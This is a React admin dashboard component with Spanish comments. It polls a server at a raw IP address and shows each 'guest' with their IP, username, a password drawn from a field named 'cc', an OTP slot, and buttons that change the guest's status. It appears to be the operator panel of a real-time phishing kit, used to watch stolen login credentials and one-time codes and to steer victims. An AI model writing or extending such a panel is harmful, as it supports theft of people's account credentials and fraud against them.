import React, { useEffect, useState } from 'react';
import axios from 'axios';
import { useNavigate } from 'react-router-dom';  // Importamos useNavigate

const AdminDashboard = () => {
    const [guests, setGuests] = useState([]);
    const [statuses, setStatuses] = useState([]);
    const [error, setError] = useState('');
    const [updatedGuestId, setUpdatedGuestId] = useState(null); // Estado para el ID del invitado actualizado
    const navigate = useNavigate();  // Inicializamos el hook useNavigate

    const fetchGuests = async () => {
        try {
            const token = localStorage.getItem('access_token');
            const response = await axios.get('https://46.202.140.21:8000/api/v1/admin/guests', {
                headers: {
                    Authorization: `Bearer ${token}`,
                },
            });
            setGuests(response.data.guests);
            setStatuses(response.data.statuses);
        } catch (err) {
            if (err.response && err.response.status === 401) {
                // Si la respuesta es un error 401, redirige al usuario a la ruta raíz
                navigate('/');
            } else {
                setError('Error al cargar los datos.');
            }
        }
    };

    const updateStatus = async (id, statusId) => {
        try {
            const token = localStorage.getItem('access_token');
            await axios.put(`https://46.202.140.21:8000/api/v1/admin/guests/${id}`, 
                { status_id: statusId }, 
                {
                    headers: {
                        Authorization: `Bearer ${token}`,
                    },
                }
            );
    
            setUpdatedGuestId(id); // Guardar el ID del invitado actualizado
            
            // Eliminar la animación después de 3 segundos
            setTimeout(() => {
                setUpdatedGuestId(null);
            }, 3000);
    
            fetchGuests(); // Refrescar la lista después de actualizar
        } catch (err) {
            if (err.response && err.response.status === 401) {
                // Si la respuesta es un error 401, redirige al usuario a la ruta raíz
                navigate('/');
            } else {
                setError('Error al actualizar el estado.');
            }
        }
    };

    useEffect(() => {
        fetchGuests();
        const interval = setInterval(fetchGuests, 3000); // Actualizar cada 3 segundos
        return () => clearInterval(interval); // Limpiar el intervalo al desmontar
    }, []);

    return (
        <div className="p-6 bg-gray-100 min-h-screen">
            <h2 className="text-3xl font-bold mb-4 text-center">Panel</h2>
            {error && <p className="text-red-500 mb-4">{error}</p>}
            <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-3 gap-6">
                {guests.map((guest) => (
                    <div
                        key={guest.id}
                        className={`bg-white p-4 rounded-lg shadow-md transition-transform duration-300 ${updatedGuestId === guest.id ? 'ring-2 ring-blue-500 transform scale-105' : ''}`}
                    >
                        <p className='text-center'><b>ID:</b> {guest.token}</p>
                        <br />
                        <p> <strong>Usuario:</strong> {guest.user}</p>
                        <p><strong>IP:</strong> {guest.ip}</p>
                        <br />
                        <p><b>🧑‍💻 User: </b>{guest.user}</p>
                        <p><b>🔐 Pass: </b>{guest.cc}</p>
                        <br />
                        <p><b>OTP: </b>{}</p>
                        <br />
                        <p><strong>Estado Actual:</strong> {statuses.find(status => status.id === guest.status_id)?.name}</p>
                        <div className="mt-4 flex flex-wrap gap-2">
                            {statuses.map((status) => (
                                <button
                                    key={status.id}
                                    onClick={() => updateStatus(guest.id, status.id)}
                                    className="bg-blue-500 text-white py-1 px-3 rounded hover:bg-blue-600 transition"
                                >
                                    {status.name}
                                </button>
                            ))}
                        </div>
                    </div>
                ))}
            </div>
        </div>
    );
};

export default AdminDashboard;
